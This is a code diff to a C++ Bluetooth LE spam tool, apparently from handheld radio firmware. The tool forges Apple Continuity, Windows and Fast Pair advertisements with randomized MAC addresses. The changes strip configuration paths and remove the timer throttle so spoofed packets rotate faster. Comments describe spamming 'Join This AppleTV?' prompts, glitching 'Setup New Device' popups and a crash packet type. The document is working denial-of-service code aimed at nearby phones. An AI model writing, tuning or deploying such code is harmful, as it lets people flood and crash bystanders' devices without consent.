@@ -284,18 +284,13 @@ void BLESpamView::createWindowsPacket() {
 }
 
 void BLESpamView::createIosPacket(bool crash = false) {
-    ContinuityCfg* cfg = NULL;
     uint8_t ios_packet_sizes[18] = {0, 0, 0, 0, 0, 24, 0, 31, 0, 12, 0, 0, 20, 0, 12, 11, 11, 17};
     ContinuityType type;
-    if (cfg && cfg->type != 0x00) {
-        type = cfg->type;
-    } else {
-        const ContinuityType types[] = {
-            ContinuityTypeProximityPair,
-            ContinuityTypeNearbyAction,
-        };
-        type = types[rand() % COUNT_OF(types)];
-    }
+    const ContinuityType types[] = {
+        ContinuityTypeProximityPair,
+        ContinuityTypeNearbyAction,
+    };
+    type = types[rand() % COUNT_OF(types)];
     if (crash) type = ContinuityTypeCustomCrash;
 
     uint8_t size = ios_packet_sizes[type];
@@ -345,21 +340,17 @@ void BLESpamView::createIosPacket(bool crash = false) {
                     color = pp_models[model_index].colors[color_index].value;
                     break;
                 }
-                case PayloadModeValue:
-                    model = cfg->data.proximity_pair.model;
-                    color = cfg->data.proximity_pair.color;
-                    break;
+                    /* case PayloadModeValue:
+                         model = cfg->data.proximity_pair.model;
+                         color = cfg->data.proximity_pair.color;
+                         break;*/
             }
 
             uint8_t prefix;
-            if (cfg && cfg->data.proximity_pair.prefix != 0x00) {
-                prefix = cfg->data.proximity_pair.prefix;
-            } else {
-                if (model == 0x0055 || model == 0x0030)
-                    prefix = 0x05;
-                else
-                    prefix = 0x01;
-            }
+            if (model == 0x0055 || model == 0x0030)
+                prefix = 0x05;
+            else
+                prefix = 0x01;
 
             packet[i++] = prefix;                                // Prefix (paired 0x01 new 0x07 airtag 0x05)
             packet[i++] = (model >> 0x08) & 0xFF;                // Device Model
@@ -420,19 +411,16 @@ void BLESpamView::createIosPacket(bool crash = false) {
                 default:
                     action = na_actions[rand() % na_actions_count].value;
                     break;
-                case PayloadModeValue:
-                    action = cfg->data.nearby_action.action;
-                    break;
+                    /* case PayloadModeValue:
+                         action = cfg->data.nearby_action.action;
+                         break;*/
             }
 
             uint8_t flags;
-            if (cfg && cfg->data.nearby_action.flags != 0x00) {
-                flags = cfg->data.nearby_action.flags;
-            } else {
-                flags = 0xC0;
-                if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
-                if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'
-            }
+
+            flags = 0xC0;
+            if (action == 0x20 && rand() % 2) flags--;       // More spam for 'Join This AppleTV?'
+            if (action == 0x09 && rand() % 2) flags = 0x40;  // Glitched 'Setup New Device'
 
             packet[i++] = flags;                      // Action Flags
             packet[i++] = action;                     // Action Type
@@ -502,7 +490,7 @@ void BLESpamView::createFastPairPacket() {
 
 void BLESpamView::changePacket(bool forced = false) {
     counter++;  // need to send it multiple times to be accepted
-    if (counter >= 5 || forced) {
+    if (counter >= 3 || forced) {
         // really change packet and mac.
         counter = 0;
         randomizeMac();
@@ -527,17 +515,19 @@ void BLESpamView::changePacket(bool forced = false) {
                     break;
             }
         }
-        console.writeln(advertisementData);
+        // rate limit console display
+        displayCounter++;
+        if (displayCounter > 5) {
+            displayCounter = 0;
+            console.writeln(advertisementData);
+        }
     }
 }
 // called each 1/60th of second, so 6 = 100ms
 void BLESpamView::on_timer() {
-    if (++timer_count == timer_period) {
-        timer_count = 0;
-        if (is_running) {
-            changePacket();
-            reset();
-        }
+    if (is_running) {
+        changePacket();
+        reset();
     }
 }
 
